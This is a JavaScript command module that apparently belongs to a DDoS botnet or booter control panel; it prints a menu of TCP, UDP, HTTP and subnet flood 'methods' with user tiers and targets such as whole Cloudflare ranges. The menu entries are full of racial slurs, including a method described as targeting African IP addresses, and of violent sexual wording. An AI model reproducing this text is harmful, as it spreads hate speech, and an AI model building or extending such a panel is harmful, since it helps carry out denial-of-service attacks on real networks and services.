const global = require('../global')

module.exports = {
    name: 'methods',
    execute(args, stream){
        stream.write(global.cls)
        stream.write('  [ \x1b[38;5;45mTCP METHODS\x1b[0m ]\x1b[0m\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-nigganet           All raw power\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-subsubsubsubnet    All IPv4s possible\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-unnamed            NiggaNet all funnel\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-ipv6portrange      IPv6 all ports\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-minecraft          Minecraft servers\r\n')

        stream.write('  [ \x1b[38;5;45mSUBNET METHODS\x1b[0m ]\x1b[0m\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-subnet             0.0.0.*\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | tcp-subsubsubnet       0.*.*.*\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | http-tld               All websites with specified .tld\r\n')
        
        stream.write('  [ \x1b[38;5;45mHTTP METHODS\x1b[0m ]\x1b[0m\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | http-gaysex            Rapes a website\r\n')
        stream.write('\x1b[38;5;41mVIP++\x1b[0m | http-dos               Single device attack\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | http-cf                Downs entire cloudflare range\r\n')

        stream.write('  [ \x1b[38;5;45mUDP METHODS\x1b[0m ]\x1b[0m\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | udp-ipv6               IPv6 raw\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | udp-anal               Anally gay sex rape a router to death\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | udp-website            Rape website using UDP (works 2% of the time)\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | udp-nigger             Hits off any african IP, nothing else\r\n')
        
        stream.write('  [ \x1b[38;5;45mNIGGA METHODS\x1b[0m ]\x1b[0m\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | nigger                 All methods, all ips, all ports\r\n')
        stream.write('\x1b[38;5;9mAdmin\x1b[0m | nigga-subx8net         subsubsubsubsubsubsubsubnet ipv6\r\n\r\n')
    }
}